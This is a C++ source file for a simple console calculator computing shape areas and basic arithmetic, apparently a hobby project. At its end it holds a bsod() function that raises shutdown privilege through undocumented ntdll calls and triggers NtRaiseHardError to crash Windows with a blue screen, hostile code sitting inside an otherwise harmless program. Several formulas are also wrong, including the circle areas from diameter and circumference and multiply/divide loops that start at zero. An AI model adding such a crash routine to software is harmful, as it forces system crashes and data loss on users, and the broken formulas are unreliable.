#include <iostream>
#include <cmath>
#include <windows.h>
#include"operator.h"

const double pi = 3.14159265358979323846;

// Define function pointers for the undocumented Native API calls to bypass IDE definition errors
typedef NTSTATUS(NTAPI* pfnRtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef NTSTATUS(NTAPI* pfnNtRaiseHardError)(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);

// Calculating the area of Circle's
void circleradius()
{
	double radius;
	std::cout << "Enter the Radius: ";
	std::cin >> radius;
	std::cout << "Area = " << pi * radius * radius;
}

void circlediameter()
{
	double diameter;	
	std::cout << "Enter the Diameter: ";
	std::cin >> diameter;
	std::cout << "Area = " << pi * diameter;
}

void circlecircumference()
{
	double circumference;
	std::cout << "Enter the Circumference: ";
	std::cin >> circumference;
	std::cout << "Area = " << (circumference * circumference) / 4 * pi;
}

// Calculating the area of Polygons
void trianglearea()
{
	double base;
	double height;
	std::cout << "Enter the Base: ";
	std::cin >> base;
	std::cout << "Enter the Height: ";
	std::cin >> height;
	std::cout << "Area = " << (base * height) / 2;
}

void squarearea()
{
	double base;
	double height;
	std::cout << "Enter the Base: ";
	std::cin >> base;
	std::cout << "Enter the Height: ";
	std::cin >> height;
	std::cout << "Area = " << base * height;
}


// Calulating with Operators now
void divideXbyY()
{
	double num1;
	double num2;
	std::cout << "Enter the First Number: ";
	std::cin >> num1;
	std::cout << "Enter the Second Number: ";
	std::cin >> num2;
	double ans2 = num1 / num2; // a lil trickery to make vs2022 hush about it being a int. this is not a good practice though i think, lol.
	if (std::fmod(num1, num2) == 0.0)
	{
		std::cout << num1 << " divided by " << num2 << " IS a whole number\n";
		std::cout << num1 << " divided by " << num2 << " = " << ans2;
	}
	else
	{
		std::cout << num1 << " divided by " << num2 << " is NOT a whole number\n";
		std::cout << num1 << " divided by " << num2 << " = " << ans2 << " approximately";
	}

}

void adding()
{
	int ammountOfadditions;
	std::cout << "How many Additions: ";
	std::cin >> ammountOfadditions;

	double basenum = 0;

	for (int i = 1; i <= ammountOfadditions; i++)
	{
		double addingnum;
		std::cout << "Enter number " << i << " of " << ammountOfadditions << ": ";
		std::cin >> addingnum;

		basenum += addingnum;
	}
	std::cout << "\nThe Total is " << basenum << "\n";
}


void subracting()
{
	int ammountOfadditions;
	std::cout << "How many Subtractions: ";
	std::cin >> ammountOfadditions;

	double basenum = 0;

	for (int i = 1; i <= ammountOfadditions; i++)
	{
		double addingnum;
		std::cout << "Enter number " << i << " of " << ammountOfadditions << ": ";
		std::cin >> addingnum;

		basenum -= addingnum;
	}
	std::cout << "\nThe Total is " << basenum << "\n";
}

void multiplying()
{
	int ammountOfadditions;
	std::cout << "How many Multiplications: ";
	std::cin >> ammountOfadditions;

	double basenum = 0;

	for (int i = 1; i <= ammountOfadditions; i++)
	{
		double addingnum;
		std::cout << "Enter number " << i << " of " << ammountOfadditions << ": ";
		std::cin >> addingnum;

		basenum *= addingnum;
	}
	std::cout << "\nThe Total is " << basenum << "\n";
}

void dividing()
{
	int ammountOfadditions;
	std::cout << "How many Divisions: ";
	std::cin >> ammountOfadditions;

	double basenum = 0;

	for (int i = 1; i <= ammountOfadditions; i++)
	{
		double addingnum;
		std::cout << "Enter number " << i << " of " << ammountOfadditions << ": ";
		std::cin >> addingnum;

		basenum /= addingnum;
	}
	std::cout << "\nThe Total is " << basenum << "\n";
}

void squareroot()
{
	double number = 0;
	std::cout << "What is the number: ";
	std::cin >> number;

	double ans = std::sqrt(number);
	std::cout << "The square root of " << number << " is " << ans;
}

void powerof()
{
	int power;
	double number;
	double ans = 1;	
	std::cout << "What is the Base Number: ";
	std::cin >> number;
	std::cout << "What is the Exponent: ";
	std::cin >> power;
	for (int i = 1; i <= power; i++)
	{
		ans *= number;
	}
	std::cout << number << " to the Power of " << power << " is " << ans;
}

int bsod()
{
	// Dynamically load ntdll.dll at runtime to clear up IDE errors
	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
	if (!hNtdll) return 1;

	pfnRtlAdjustPrivilege RtlAdjustPrivilege = (pfnRtlAdjustPrivilege)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
	pfnNtRaiseHardError NtRaiseHardError = (pfnNtRaiseHardError)GetProcAddress(hNtdll, "NtRaiseHardError");

	if (RtlAdjustPrivilege && NtRaiseHardError)
	{
		BOOLEAN bl;
		ULONG response;

		// 19 is SeShutdownPrivilege
		RtlAdjustPrivilege(19, TRUE, FALSE, &bl);

		// Trigger a hard error with STATUS_ASSERTION_FAILURE (0xC0000420)
		NtRaiseHardError(0xC0000420, 0, 0, nullptr, 6, &response);
	}

	return 0;
}